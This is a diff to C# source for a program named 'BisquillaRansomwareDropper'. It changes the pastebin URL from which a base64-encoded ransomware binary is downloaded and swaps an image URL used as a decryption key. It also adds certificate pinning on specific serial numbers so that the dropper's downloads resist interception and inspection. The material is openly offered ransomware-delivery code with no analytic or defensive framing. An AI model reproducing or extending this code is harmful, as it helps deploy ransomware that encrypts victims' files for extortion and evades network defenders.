@@ -11,6 +11,8 @@ using System.Net;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.IO;
+using System.Security.Cryptography.X509Certificates;
+using System.Net.Security;
 
 namespace BisquillaRansomwareDropper
 {
@@ -20,12 +22,12 @@ namespace BisquillaRansomwareDropper
         /// <summary>
         /// Path to Download Bae64 Ransomware Binary
         /// </summary>
-        private const string RANSOMWARE_DOWNLOAD_PATH = "https://pastebin.com/raw/0w2YZMhP";
+        private const string RANSOMWARE_DOWNLOAD_PATH = "https://pastebin.com/raw/a5zDEeh9";
 
         /// <summary>
         /// Image Path to be Used as Decryption Key
         /// </summary>
-        private const string DECRYPTION_IMAGE_URI = "https://extra.globo.com/incoming/5921498-9a8-629/w1920h1080/marte-1.jpg";
+        private const string DECRYPTION_IMAGE_URI = "https://s2.glbimg.com/gyvEpPSlnA87YeaVxNCyCwtlIc0=/e.glbimg.com/og/ed/f/original/2018/05/02/pia22227-full.jpg";
 
         [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
@@ -147,6 +149,19 @@ namespace BisquillaRansomwareDropper
         /// <returns>File Path</returns>
         private static string DownloadAndSaveToDisk()
         {
+
+            // Setup SSL Certificate Pinning
+            ServicePointManager.ServerCertificateValidationCallback = delegate (object sender, X509Certificate certificate, X509Chain chain, System.Net.Security.SslPolicyErrors sslPolicyErrors)
+            {
+                // Check SSL Certificate
+                return
+                    certificate.GetSerialNumberString() == "05B2341C8311FA0EC51574B3C5C476E5" || // https://s2.glbimg.com via Direct Serial Number Verification
+                    (
+                        chain.ChainElements[0].Certificate.GetSerialNumberString() == "05844945EC3913B7BA791348BD8DBF5D" &&
+                        chain.ChainElements[1].Certificate.GetSerialNumberString() == "0BA2D01DCBCB7776E8AC65097AC12541" &&
+                        chain.ChainElements[2].Certificate.GetSerialNumberString() == "4CAAF9CADB636FE01FF74ED85B03869D"
+                    ); // https://pastebin.com/ via Chain Validation (Because Cloudflare emits several certificates)
+            };
 
             // Download Ransomware Base64 Data
             byte[] encryptedRansomware = System.Convert.FromBase64String(
